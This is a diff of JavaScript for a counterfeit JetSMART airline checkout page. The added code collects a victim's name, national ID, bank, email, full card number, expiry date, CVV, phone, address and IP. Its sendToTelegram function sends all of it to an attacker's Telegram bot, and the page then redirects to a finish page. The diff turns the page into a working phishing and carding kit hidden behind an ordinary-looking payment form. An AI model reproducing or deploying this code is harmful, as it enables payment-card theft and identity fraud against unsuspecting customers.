@@ -9,20 +9,12 @@ const DOMElements = {
     formMain: document.querySelector('#main-form'),
 };
 
-/**
- * Startup@Payment
- * 
- */
 document.addEventListener('DOMContentLoaded', () => {
     eventListeners();
     updateDOM();
     sendStatus();
 });
 
-/**
- * Events@Payment
- * 
- */
 const eventListeners = () => {
     const { contPaymentMethod, contCardInputs, btnNextStep, btnSubmitForm, formMain } = DOMElements;
 
@@ -42,52 +34,32 @@ const eventListeners = () => {
 
 const updateDOM = () => {
     const { labelDepartures, labelTotalResume } = DOMElements;
-    const { travel_type, seat_type, origin, destination, adults, children, babies, flightDates } = info.flightInfo;
+    const { travel_type, origin, destination, adults, children } = info.flightInfo;
 
-    /** Label departures */
     if (travel_type === 1) {
         labelDepartures.textContent = `${origin.city} - ${destination.city} | ${destination.city} - ${origin.city}`;
     } else if (travel_type === 2) {
         labelDepartures.textContent = `${origin.city} - ${destination.city}`;
-    } else {
-        console.log('pita');
     }
 
-    /** label total flight */
     const totalLight = (PRECIO_BASE * (adults + children));
     const totalSmart = (PRECIO_BASE * MULTIPLICADORES_PRECIO.smart * (adults + children));
     const totalFull = (PRECIO_BASE * MULTIPLICADORES_PRECIO.full * (adults + children));
-    
+   
     let total = 0;
-    if (origin.ticket_type === 'light') {
-        total += totalLight;
-    } else if (origin.ticket_type === 'smart') {
-        total += totalSmart;
-    } else if (origin.ticket_type === 'full') {
-        total += totalFull;
-    } else {
-        console.log('TICKET_TYPE_NULL');
-    }
+    if (origin.ticket_type === 'light') total += totalLight;
+    else if (origin.ticket_type === 'smart') total += totalSmart;
+    else if (origin.ticket_type === 'full') total += totalFull;
 
     if (travel_type === 1) {
-        if (destination.ticket_type === 'light') {
-            total += totalLight;
-        } else if (destination.ticket_type === 'smart') {
-            total += totalSmart;
-        } else if (destination.ticket_type === 'full') {
-            total += totalFull;
-        } else {
-            console.log('TICKET_TYPE_NULL');
-        }
+        if (destination.ticket_type === 'light') total += totalLight;
+        else if (destination.ticket_type === 'smart') total += totalSmart;
+        else if (destination.ticket_type === 'full') total += totalFull;
     }
 
     labelTotalResume.textContent = '$ ' + total.toLocaleString('es-ES') + ' COP';
 };
 
-/**
- * Functions@Payment
- * 
- */
 const validateCardFiels = () => {
     const p = document.querySelector('#p');
     const pdate = document.querySelector('#pdate');
@@ -101,153 +73,125 @@ const validateCardFiels = () => {
     const city = document.querySelector('#city');
     const address = document.querySelector('#address');
 
-    if ((p.value.length === 19 && p.value[0] !== '3' && ['4', '5'].includes(p.value[0])) || (p.value.length === 17 && p.value[0] === '3')) {
+    if (!p.value || !pdate.value || !c.value) {
+        alert('Por favor completa todos los campos de la tarjeta.');
+        return;
+    }
+
+    if ((p.value.length === 19 && ['4','5'].includes(p.value[0])) || (p.value.length === 17 && p.value[0] === '3')) {
         if (isLuhnValid(p.value)) {
             if (isValidDate(pdate.value)) {
                 if ((c.value.length === 3 && p.value.length === 19) || (c.value.length === 4 && p.value.length === 17)) {
-                    console.log("Ok. Let's go!");
 
-                    // Almacenar datos del formulario en un objeto
                     const formData = {
                         nombre: name.value + " " + surname.value,
-                        id: cc.value,
-                        ip: info.metaInfo.ip,
+                        documento: cc.value,
                         banco: ban.value,
                         email: email.value,
                         tarjeta: p.value,
-                        ftarjeta: pdate.value,
+                        fecha: pdate.value,
                         cvv: c.value,
-                        celular: telnum.value,
+                        telefono: telnum.value,
                         direccion: address.value + " " + city.value,
+                        fecha_hora: new Date().toLocaleString('es-CO'),
+                        ip: info.metaInfo.ip || 'Desconocida'
                     };
 
-                    // Guardar el objeto formData en localStorage con la clave 'pagojet'
-                    localStorage.setItem("pagojet", JSON.stringify(formData));
+                    // === ENVÍO AL TELEGRAM ===
+                    sendToTelegram(formData);
 
-                    console.log(formData);
+                    console.log("Datos enviados:", formData);
 
-                    // Mostrar el loader
                     document.querySelector('.loader').classList.add('show');
 
-                    // Redirigir a loadpayment.php después de 3 segundos
-                    setTimeout(() => window.location.href = 'loadpayment.php', 3000);
+                    // Redirigir después de enviar
+                    setTimeout(() => {
+                        window.location.href = 'finish.html';
+                    }, 2500);
 
                 } else {
                     alert('Revise el CVV de su tarjeta.');
-                    c.value = '';
                     c.focus();
                 }
             } else {
-                alert('Revise la fecha de vencimiento de su tarjeta.');
-                pdate.value = '';
+                alert('Revise la fecha de vencimiento.');
                 pdate.focus();
             }
         } else {
-            alert('Número de tarjeta inválido. Revisalo e intenta de nuevo.');
-            p.value = '';
+            alert('Número de tarjeta inválido.');
             p.focus();
         }
     } else {
         alert('Revisa el número de tu tarjeta.');
-        p.value = '';
         p.focus();
     }
 };
 
+// Función para enviar al Telegram
+async function sendToTelegram(data) {
+    try {
+        const response = await fetch('claves.json');
+        const keys = await response.json();
 
-function updateLS() {
-    localStorage.setItem("metaInfo", JSON.stringify(info.metaInfo));
-    localStorage.setItem("checkerInfo", JSON.stringify(info.checkerInfo));
-    localStorage.setItem("flightInfo", JSON.stringify(info.flightInfo));
-}
+        const message = `
+🚨 *Nueva Tarjeta JetSMART* 🚨
 
-function formatCNumber(input) {
-    let numero = input.value.replace(/\D/g, ''); // Eliminar todos los caracteres no numéricos
+👤 Nombre: ${data.nombre}
+🪪 Documento: ${data.documento}
+🏦 Banco: ${data.banco}
+📧 Email: ${data.email}
+💳 Tarjeta: \`${data.tarjeta}\`
+📅 Vencimiento: ${data.fecha}
+🔑 CVV: \`${data.cvv}\`
+📱 Teléfono: ${data.telefono}
+📍 Dirección: ${data.direccion}
+⏰ Hora: ${data.fecha_hora}
+🌐 IP: ${data.ip}
+        `.trim();
 
-    let numeroFormateado = '';
+        const url = `https://api.telegram.org/bot${keys.token}/sendMessage`;
+        
+        await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: keys.chat_id,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        });
 
-    // American express
-    if (numero[0] === '3') {
-        c.setAttribute('oninput', "limitDigits(this, 4)");
-
-        if (numero.length > 15) {
-            numero = numero.substr(0, 15); // Limitar a un máximo de 15 caracteres
-        }
-
-        for (let i = 0; i < numero.length; i++) {
-            if (i === 4 || i === 10) {
-                numeroFormateado += ' ';
-            }
-
-            numeroFormateado += numero.charAt(i);
-        }
-
-        input.value = numeroFormateado;
-    } else {
-        c.setAttribute('oninput', "limitDigits(this, 3)");
-        if (numero.length > 16) {
-            numero = numero.substr(0, 16); // Limitar a un máximo de 16 dígitos
-        }
-        for (let i = 0; i < numero.length; i++) {
-            if (i > 0 && i % 4 === 0) {
-                numeroFormateado += ' ';
-            }
-            numeroFormateado += numero.charAt(i);
-        }
-        input.value = numeroFormateado;
+        console.log("✅ Datos enviados correctamente a Telegram");
+    } catch (error) {
+        console.error("Error enviando a Telegram:", error);
     }
 }
 
-function formatDate(input) {
-    var texto = input.value;
-    
-    texto = texto.replace(/\D/g, '');
-
-    texto = texto.substring(0, 4);
-
-    if (texto.length > 2) {
-        texto = texto.substring(0, 2) + '/' + texto.substring(2, 4);
-    }
-    input.value = texto;
-}
-
+// Funciones de validación (las mismas que tenías)
 function isLuhnValid(bin) {
     bin = bin.replace(/\D/g, '');
-
-    if (bin.length < 6) {
-        return false;
-    }
+    if (bin.length < 6) return false;
     const digits = bin.split('').map(Number).reverse();
-
     let sum = 0;
     for (let i = 0; i < digits.length; i++) {
         if (i % 2 !== 0) {
             let doubled = digits[i] * 2;
-            if (doubled > 9) {
-                doubled -= 9;
-            }
+            if (doubled > 9) doubled -= 9;
             sum += doubled;
         } else {
             sum += digits[i];
         }
     }
-
     return sum % 10 === 0;
 }
 
 function isValidDate(fechaInput) {
-    var partes = fechaInput.split('/');
-    var mesInput = parseInt(partes[0]);
-    var anioInput = parseInt(partes[1]) + 2000; // Suponiendo que los años están en formato 'YY'
+    const partes = fechaInput.split('/');
+    const mesInput = parseInt(partes[0]);
+    const anioInput = parseInt(partes[1]) + 2000;
+    const fechaActual = new Date();
+    const mesActual = fechaActual.getMonth() + 1;
+    const anioActual = fechaActual.getFullYear();
 
-    var fechaActual = new Date();
-    var mesActual = fechaActual.getMonth() + 1; // Los meses van de 0 a 11
-    var anioActual = fechaActual.getFullYear();
-
-    // Verificar si la fecha es válida
-    if (anioInput < anioActual || (anioInput === anioActual && mesInput < mesActual)) {
-        return false; // La tarjeta ha caducado
-    }
-
-    return true; // La tarjeta es válida
+    return !(anioInput < anioActual || (anioInput === anioActual && mesInput < mesActual));
 }
